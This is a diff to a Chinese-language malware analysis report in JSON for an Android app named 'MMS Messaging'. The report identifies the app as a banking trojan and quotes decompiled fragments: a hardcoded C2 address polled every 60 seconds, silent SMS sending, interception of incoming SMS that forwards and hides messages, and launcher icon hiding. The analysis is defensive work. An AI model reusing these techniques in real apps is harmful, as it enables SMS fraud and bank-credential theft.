@@ -6,7 +6,7 @@
     "应用名": "MMS Messaging",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 159.4
+    "分析耗时(秒)": 364.6
   },
   "行为列表": [
     {
@@ -29,9 +29,9 @@
           "malicious_behavior": "c2_communication",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://37.1.204.175/?action=command\";",
-          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://37.1.204.175/?action=command\";\n      public static final String APP_ID = \"APP_ID\";\n      public static final String CARD_SENT = \"CARD_SENT\";\n      public static final String INSTALL_ID = \"1\";",
-          "behavior_description": "代码硬编码了C2服务器地址 http://37.1.204.175/?action=command，使用裸IP+HTTP明文协议，URL参数action=command表明该端点用于获取远程控制指令。结合同文件中INTERCEPTING_ENABLED（拦截开关）、LOCK_ENABLED（锁屏开关）、REQUEST_INTERVAL=60（60秒轮询间隔）等常量，可确认该APK通过定期轮询此C2地址获取远程命令，实现对受感染设备的远程控制，包括短信拦截、设备锁定等功能。",
+          "malicious_code_snippet": "public static final String ADMIN_LINK = \"http://37.1.204.175/?action=command\";\npublic static final String INTERCEPTING_ENABLED = \"INTERCEPTING_ENABLED\";\npublic static final String LOCK_ENABLED = \"LOCK_ENABLED\";\npublic static final int REQUEST_INTERVAL = 60;",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class Constants {\n>>>     public static final String ADMIN_LINK = \"http://37.1.204.175/?action=command\";\n>>>     public static final String APP_ID = \"APP_ID\";\n>>>     public static final String CARD_SENT = \"CARD_SENT\";\n>>>     public static final String INSTALL_ID = \"1\";\n      public static final String INSTALL_SENT = \"INSTALL_SENT\";\n      public static final String INTERCEPTING_ENABLED = \"INTERCEPTING_ENABLED\";\n      public static final String LOCK_ENABLED = \"LOCK_ENABLED\";",
+          "behavior_description": "该类是银行木马的C2通信配置常量类。硬编码了基于裸IP的C2服务器地址（37.1.204.175），并携带action=command参数用于拉取远程控制指令；REQUEST_INTERVAL=60表示每60秒向C2服务器轮询一次新命令。配合INTERCEPTING_ENABLED（短信拦截开关）、LOCK_ENABLED（设备锁屏开关）、CARD_SENT（银行卡数据已回传标记）等标志位，构成完整的远程控制配置。数据流向：本地配置常量（C2地址+轮询间隔）→ 定期向硬编码IP的C2服务器发起HTTP请求获取指令 → 执行短信拦截、锁屏、窃取银行卡凭证等恶意操作。该特征与Mandiant报告中的SlemBunk/RuMMS系欧洲Smishing覆盖攻击银行木马（丹麦/意大利campaign）完全吻合，包名exts.denmark亦对应丹麦传播活动。",
           "glm_analyzed": true
         }
       ]
@@ -80,7 +80,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "sms.sendMultipartTextMessage(number, null, parts, sents, null);\nsms.sendTextMessage(number, null, text, PendingIntent.getBroadcast(context, 0, sentIntent2, 134217728), null);",
           "malicious_code_snippet_context": "                      sentIntent.putExtra(\"text\", parts.get(i));\n                      sents.add(PendingIntent.getBroadcast(context, 0, sentIntent, 134217728));\n                  }\n>>>                 sms.sendMultipartTextMessage(number, null, parts, sents, null);\n>>>                 return;\n              }\n              Intent sentIntent2 = new Intent(Starter.ACTION_REPORT);\n              sentIntent2.putExtra(\"number\", number);",
-          "behavior_description": "代码使用SmsManager的sendMultipartTextMessage和sendTextMessage方法，在后台静默发送短信到指定号码，无需用户交互，可能导致用户被扣费或传播恶意信息。",
+          "behavior_description": "该代码通过 SmsManager 的 sendMultipartTextMessage() 和 sendTextMessage() 在无任何用户交互的情况下静默发送短信（支持长短信分段发送），并通过 PendingIntent 广播（ACTION_REPORT）回执发送结果。短信的目标号码（number）和内容（text）来源于程序内部变量（通常由 C2 服务器指令或钓鱼短信模板下发），直接流向短信发送 API。结合类路径 exts.denmark.utils 及厂商报告（2016年丹麦/意大利 Smishing 钓鱼传播的 Overlay 银行木马），这是典型的短信自我传播/钓鱼欺诈行为：木马静默向受害者联系人或指定号码发送含恶意链接的钓鱼短信以扩散自身并实施银行凭证窃取，直接造成用户资费消耗和恶意软件传播。",
           "glm_analyzed": true
         },
         {
@@ -89,9 +89,9 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\nif (needToInterceptIncoming) {\n    abortBroadcast();\n}",
-          "malicious_code_snippet_context": "          Map<String, String> messages = retrieveMessages(intent);\n          for (String sender : messages.keySet()) {\n              String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n              start.putExtra(\"text\", text);\n              context.startService(start);\n              if (needToInterceptIncoming) {",
-          "behavior_description": "代码从短信广播Intent中提取短信PDU数据，根据配置开关INTERCEPTING_ENABLED决定是否调用abortBroadcast()中止有序广播，从而阻止系统短信应用及其他应用接收到该短信，实现短信拦截。同时将拦截到的短信内容通过SendService上报，典型用于隐藏验证码/银行通知短信以实施欺诈。",
+          "malicious_code_snippet": "boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\nIntent start = new Intent(context, (Class<?>) SendService.class);\nstart.setAction(SendService.REPORT_INCOMING_MESSAGE);\nstart.putExtra(\"number\", sender);\nstart.putExtra(\"text\", text);\ncontext.startService(start);\nif (needToInterceptIncoming) {\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "          Map<String, String> messages = retrieveMessages(intent);\n          for (String sender : messages.keySet()) {\n              String text = messages.get(sender);\n>>>             boolean needToInterceptIncoming = settings.getBoolean(Constants.INTERCEPTING_ENABLED, false);\n>>>             Intent start = new Intent(context, (Class<?>) SendService.class);\n>>>             start.setAction(SendService.REPORT_INCOMING_MESSAGE);\n>>>             start.putExtra(\"number\", sender);\n>>>             start.putExtra(\"text\", text);\n>>>             context.startService(start);\n>>>             if (needToInterceptIncoming) {\n>>>                 abortBroadcast();\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "该代码位于短信广播接收器中。它从广播Intent的extras中解析SMS PDU数据，提取发件人号码和短信正文，然后将短信内容（number、text）通过startService传递给SendService（REPORT_INCOMING_MESSAGE动作），用于将截获的短信上报/外传；随后若配置项INTERCEPTING_ENABLED开启，则调用abortBroadcast()终止广播，使系统短信应用及其他应用无法收到该短信，从而对用户隐藏短信内容。数据流向：短信广播PDU（source）→ startService外传短信内容 + abortBroadcast()拦截隐藏短信（sink）。该行为与报告中丹麦Smishing/Overlay银行木马（SlemBunk类）手法吻合：拦截并隐藏银行验证码和交易通知短信，配合覆盖钓鱼界面窃取银行凭证，直接造成用户资金损失和隐私泄露。",
           "glm_analyzed": true
         }
       ]
@@ -114,10 +114,10 @@
           "method_signature": "hide()",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
-          "malicious_code_snippet": "ComponentName componentName = new ComponentName(this, Main.class);\npackageManager.setComponentEnabledSetting(componentName, 2, 1);",
-          "malicious_code_snippet_context": "  \n      private void hide() {\n          PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n      }\n  }",
-          "behavior_description": "通过PackageManager.setComponentEnabledSetting将应用主Activity组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），使应用图标从桌面启动器中消失，隐藏自身存在以逃避用户察觉和卸载，为后台恶意服务提供隐蔽运行环境。",
+          "risk_level": "高",
+          "malicious_code_snippet": "private void hide() {\n    PackageManager packageManager = getPackageManager();\n    ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n    packageManager.setComponentEnabledSetting(componentName, 2, 1);\n}",
+          "malicious_code_snippet_context": "          finish();\n      }\n  \n>>>     private void hide() {\n>>>         PackageManager packageManager = getPackageManager();\n>>>         ComponentName componentName = new ComponentName(this, (Class<?>) Main.class);\n>>>         packageManager.setComponentEnabledSetting(componentName, 2, 1);\n>>>     }\n  }",
+          "behavior_description": "该代码在启动MainService后台服务并finish()当前界面后调用hide()方法，通过PackageManager.setComponentEnabledSetting()将自身的启动器Activity组件（Main）设置为禁用状态（参数2即COMPONENT_ENABLED_STATE_DISABLED，参数1为DONT_KILL_APP），使应用图标从桌面启动器中消失。这是SlemBunk/RuMMS类银行木马与Smishing恶意软件的典型规避手法：用户被钓鱼短信诱骗安装后，图标随即被隐藏，导致用户难以察觉和卸载恶意应用，而后台MainService持续运行并实施覆盖式钓鱼攻击窃取银行凭证。数据流向：应用自身组件信息（ComponentName(Main.class)）→ setComponentEnabledSetting()禁用启动器组件 → 图标隐藏、恶意服务驻留后台。",
           "glm_analyzed": true
         }
       ]
@@ -130,7 +130,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
